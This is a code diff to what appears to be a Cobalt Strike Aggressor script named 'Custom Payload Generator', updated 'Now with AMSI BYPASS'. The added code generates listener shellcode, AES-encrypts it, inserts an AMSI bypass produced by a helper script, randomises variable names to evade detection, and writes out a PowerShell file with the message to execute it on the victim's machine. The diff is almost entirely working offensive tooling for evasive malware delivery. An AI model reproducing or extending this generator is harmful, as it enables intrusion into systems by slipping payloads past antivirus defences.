@@ -1,6 +1,6 @@
 # Custom Payload Generator
 # Author: Alex Williams
-# v1.0.7 05/31/2019
+# v1.0.8 09/20/2020 (Now with AMSI BYPASS)
 # Contact: @offsec_ginger
 # Site: https://stormctf.ninja
 # GH: https://github.com/offsecginger
@@ -127,9 +127,9 @@ sub jssettingsupdate {
 sub generate_payload {
 	$dialog = dialog("Custom Payload Generator", %(listener => "Listener: ", payload_type => "Payload Type: ", output => "output: "), &output);
 	dialog_description($dialog, "Generates a payload from a user created template.");
-	drow_listener($dialog, "listener", "Listener: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
 	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged","Stageless"));
-	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR","PowerLessShell","PowerShell w/ AES","Small C# EXE"));
+	drow_combobox($dialog, "output", "Output: ", @("MSBuild XML","JSC JScript","Windows JScript", "JSP","WAR","PowerLessShell","PowerShell w/ AES RWX","PowerShell w/ AES No-RWX", "Small C# EXE"));
 	drow_checkbox($dialog, "x64", "x64: ", "Use x64 Payload")
 	dbutton_action($dialog, "Generate");
 	dialog_show($dialog);
@@ -319,14 +319,14 @@ sub output {
 			});
 		}
 	}
-	else if ($3['output'] eq 'PowerShell w/ AES') {
+	else if ($3['output'] eq 'PowerShell w/ AES RWX') {
 		$arch = "x86";
 		if ($3['x64'] eq "true") {
 			$arch = "x64";
 		}
 		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
-			if ($3['payload_type'] eq "Staged") {
-				show_message("Stageless Payload Only for AES Powershell.");
+			if ($3['payload_type'] eq "Stageless") {
+				show_message("Staged Payload Only for AES Powershell.");
 			}
 			$payload_string = base64_encode(shellcode($3['listener'], false, $arch));
 			$handle = openf(script_resource("./templates/ps1_AES_template_".$arch.".ps1"));
@@ -337,12 +337,17 @@ sub output {
 			@result = readAll($runaes);
 			$encrypted_payload = @result[0];
 			closef($runaes);
+			$amsi_python = script_resource("./assets/amsi.py");
+			$amsi = exec("python ".$amsi_python);
+			@result_amsi = readAll($amsi);
+			$amsi_bypass = @result_amsi[0];
+			closef($result_amsi);
 			$fdata = $data;
 			for ($r = 0; $r < 50; $r++) {
 				$rstring = random_string(rand(range("5-10")));
 				$data = strrep($data, "%%VAR".$r."%%", $rstring);
 			}
-			$fdata = strrep($data, "%%PAYLOAD%%", $encrypted_payload, "%%CIPHER%%", $aeskey);
+			$fdata = strrep($data, "%%PAYLOAD%%", $encrypted_payload, "%%CIPHER%%", $aeskey, "%%AMSI%%", $amsi_bypass);
 			closef($handle);
 			$name = prompt_file_save("payload.ps1", {
 				local('$outfile');
@@ -388,6 +393,46 @@ sub output {
 				exec($compiler . " -platform:" . $arch . " -t:winexe -out:" . $1 . " " . $TEMPDIR."temp.cs" );
 				#println($compiler . " -platform:" . $arch . " -t:winexe -out:" . $1 . " " . $TEMPDIR."temp.cs");
 				show_message("Execute the file on the victims machine.");
+			});
+		}
+	}
+	else if ($3['output'] eq 'PowerShell w/ AES No-RWX') {
+		$arch = "x86";
+		if ($3['x64'] eq "true") {
+			$arch = "x64";
+		}
+		if ($3['payload_type'] eq "Staged" || $3['payload_type'] eq "Stageless") {
+			if ($3['payload_type'] eq "Stageless") {
+				show_message("Staged Payload Only for AES Powershell.");
+			}
+			$payload_string = base64_encode(shellcode($3['listener'], false, $arch));
+			$handle = openf(script_resource("./templates/ps1_AES_template_".$arch."_2.ps1"));
+			$data   = readb($handle, -1);
+			$aeskey = random_string("32");
+			$aes_python = script_resource("./assets/aes.py");
+			$runaes = exec("python ".$aes_python ." $aeskey \"$payload_string\"");
+			@result = readAll($runaes);
+			$encrypted_payload = @result[0];
+			closef($runaes);
+			$amsi_python = script_resource("./assets/amsi.py");
+			$amsi = exec("python ".$amsi_python);
+			@result_amsi = readAll($amsi);
+			$amsi_bypass = @result_amsi[0];
+			closef($result_amsi);
+			$fdata = $data;
+			for ($r = 0; $r < 50; $r++) {
+				$rstring = random_string(rand(range("5-10")));
+				$data = strrep($data, "%%VAR".$r."%%", $rstring);
+			}
+			$fdata = strrep($data, "%%PAYLOAD%%", $encrypted_payload, "%%CIPHER%%", $aeskey, "%%AMSI%%", $amsi_bypass);
+			closef($handle);
+			$name = prompt_file_save("payload.ps1", {
+				local('$outfile');
+				$outfile = openf("> $+ $1");
+				writeb($outfile, $fdata);
+				closef($outfile);
+				$filename = pop(split("/", $1));
+				show_message("Execute the PowerShell script on the victim's machine.");
 			});
 		}
 	}
